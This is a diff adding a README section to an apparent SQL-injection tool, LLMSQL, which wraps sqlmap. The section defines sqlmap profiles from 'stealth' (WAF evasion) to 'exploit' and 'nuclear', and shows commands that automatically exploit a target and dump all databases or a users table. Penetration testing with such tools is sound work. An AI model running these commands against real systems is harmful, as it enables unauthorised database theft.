@@ -177,6 +177,34 @@ sqlmap -m llmsql-sqlmap-urls.txt --batch --random-agent --level 3 --risk 2
 python -m llmsql --openapi https://target/ --guess-params --grab-cookie --run-sqlmap
 ```
 
+### sqlmap intensity profiles
+
+Pick how aggressive sqlmap should be with `--sqlmap-profile`:
+
+| Profile | Flags | Use |
+|---------|-------|-----|
+| `stealth` | level 1, risk 1, delay, safe techniques | avoid WAF/rate limits |
+| `normal` (default) | level 3, risk 2, 4 threads | balanced |
+| `aggressive` | level 5, risk 3, 10 threads | maximum detection |
+| `exploit` | aggressive + `--dbs --tables --dump-all` | auto-enumerate & dump |
+| `nuclear` | all techniques + tamper suite + `-a --dump-all` | everything, fully automatic |
+
+```bash
+# Fully automatic exploitation + data dump
+python -m llmsql --openapi https://target/ --guess-params --run-sqlmap \
+  --sqlmap-profile exploit
+
+# Interactively choose the profile and edit the exact flags before running
+python -m llmsql --openapi https://target/ --run-sqlmap --sqlmap-menu
+
+# Add/override any sqlmap flags on top of a profile
+python -m llmsql -u "https://target/x?id=1" --run-sqlmap \
+  --sqlmap-profile aggressive --sqlmap-args "--dbms=postgresql -p id --dump -T users"
+```
+
+Ctrl+C during a run is passed to sqlmap's own `[C]ontinue/[Q]uit` menu (LLMSQL
+ignores the signal so it won't crash the run).
+
 You don't strictly need all four tools — LLMSQL already does liveness probing
 (httpx's role) and can crawl input from katana OR import an OpenAPI spec. A
 minimal chain is just **llmsql --openapi ... --run-sqlmap**.
